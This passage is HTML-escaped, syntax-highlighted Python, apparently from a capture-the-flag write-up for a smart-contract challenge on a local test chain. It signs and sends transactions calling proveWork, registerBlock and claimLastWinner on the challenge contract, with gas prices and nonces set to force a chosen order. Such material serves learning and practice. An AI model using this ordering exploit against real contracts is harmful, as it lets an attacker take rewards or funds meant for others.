&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#88c0d0;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;setup:&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;challengecontract)
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#88c0d0;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;chall:&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;chall_addr)
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#88c0d0;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;player:&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;player)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    
&lt;&#x2F;span&gt;&lt;span&gt;    powed &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#88c0d0;&quot;&gt;pow&lt;&#x2F;span&gt;&lt;span&gt;(rpc&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;############### 2
&lt;&#x2F;span&gt;&lt;span&gt;    tx &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;chainId&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;31337&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;from&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span&gt;player&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;to&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span&gt;Web3&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;to_checksum_address&lt;&#x2F;span&gt;&lt;span&gt;(chall_addr)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;gasPrice&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;120000000000&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;gas&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0x60000&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;value&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;nonce&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;data&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span&gt;rpc&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;keccak&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;proveWork(bytes32)&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;encode&lt;&#x2F;span&gt;&lt;span&gt;())[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;4&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;encode_abi&lt;&#x2F;span&gt;&lt;span&gt;([&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;bytes32&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;]&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;bytes.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;fromhex&lt;&#x2F;span&gt;&lt;span&gt;(powed[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span&gt;])])
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;    
&lt;&#x2F;span&gt;&lt;span&gt;    stx &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;rpc&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;eth&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;account&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;sign_transaction&lt;&#x2F;span&gt;&lt;span&gt;(tx&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;privatekey)
&lt;&#x2F;span&gt;&lt;span&gt;    hash2 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;rpc&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;eth&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;send_raw_transaction&lt;&#x2F;span&gt;&lt;span&gt;(stx&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;raw_transaction)
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#88c0d0;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;0x&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;+&lt;&#x2F;span&gt;&lt;span&gt;hash2&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;hex&lt;&#x2F;span&gt;&lt;span&gt;())
&lt;&#x2F;span&gt;&lt;span&gt;    
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#88c0d0;&quot;&gt;__import__&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;time&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;sleep&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;############### 1
&lt;&#x2F;span&gt;&lt;span&gt;    tx &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;chainId&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;31337&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;from&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span&gt;player&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;to&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span&gt;Web3&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;to_checksum_address&lt;&#x2F;span&gt;&lt;span&gt;(chall_addr)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;gasPrice&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;130000000000&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;gas&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0x60000&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;value&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;nonce&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;data&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span&gt;rpc&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;keccak&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;registerBlock()&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;encode&lt;&#x2F;span&gt;&lt;span&gt;())[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;4&lt;&#x2F;span&gt;&lt;span&gt;]
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    stx &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;rpc&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;eth&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;account&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;sign_transaction&lt;&#x2F;span&gt;&lt;span&gt;(tx&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;privatekey)
&lt;&#x2F;span&gt;&lt;span&gt;    hash1 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;rpc&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;eth&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;send_raw_transaction&lt;&#x2F;span&gt;&lt;span&gt;(stx&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;raw_transaction)
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#88c0d0;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;0x&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;+&lt;&#x2F;span&gt;&lt;span&gt;hash1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;hex&lt;&#x2F;span&gt;&lt;span&gt;())
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;############## 4
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;# tx = {
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;#     &amp;quot;chainId&amp;quot;: 31337,
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;#     &amp;quot;from&amp;quot;: player,
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;#     &amp;quot;to&amp;quot;: Web3.to_checksum_address(chall_addr),
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;#     &amp;quot;gasPrice&amp;quot;: 8000000000,
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;#     &amp;quot;gas&amp;quot;: 0x600000,
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;#     &amp;quot;value&amp;quot;: 0,
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;#     &amp;quot;nonce&amp;quot;: 2,
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;#     &amp;quot;data&amp;quot;: rpc.keccak(&amp;quot;proveWor(bytes32)&amp;quot;.encode())[:4] + encode_abi([&amp;#39;bytes32&amp;#39;], [bytes(32)])
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;# }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;# stx = rpc.eth.account.sign_transaction(tx, privatekey)
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;# hash4 = rpc.eth.send_raw_transaction(stx.raw_transaction)
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;# print(&amp;quot;0x&amp;quot;+hash4.hex())
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;############### 3
&lt;&#x2F;span&gt;&lt;span&gt;    tx &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;chainId&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;31337&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;from&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span&gt;player&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;to&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span&gt;Web3&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;to_checksum_address&lt;&#x2F;span&gt;&lt;span&gt;(chall_addr)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;gasPrice&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1000000000&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;gas&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0x60000&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;value&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;nonce&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;data&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span&gt;rpc&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;keccak&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;claimLastWinner(address)&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;encode&lt;&#x2F;span&gt;&lt;span&gt;())[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;4&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;encode_abi&lt;&#x2F;span&gt;&lt;span&gt;([&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;address&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;]&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;[player])
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    stx &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;rpc&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;eth&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;account&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;sign_transaction&lt;&#x2F;span&gt;&lt;span&gt;(tx&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;privatekey)
&lt;&#x2F;span&gt;&lt;span&gt;    hash3 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;rpc&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;eth&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;send_raw_transaction&lt;&#x2F;span&gt;&lt;span&gt;(stx&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;raw_transaction)
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#88c0d0;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;0x&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;+&lt;&#x2F;span&gt;&lt;span&gt;hash3&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;hex&lt;&#x2F;span&gt;&lt;span&gt;())
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;# query_latest_block(rpc)
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#88c0d0;&quot;&gt;__import__&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;time&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;sleep&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;10&lt;&#x2F;span&gt;&lt;span&gt;)
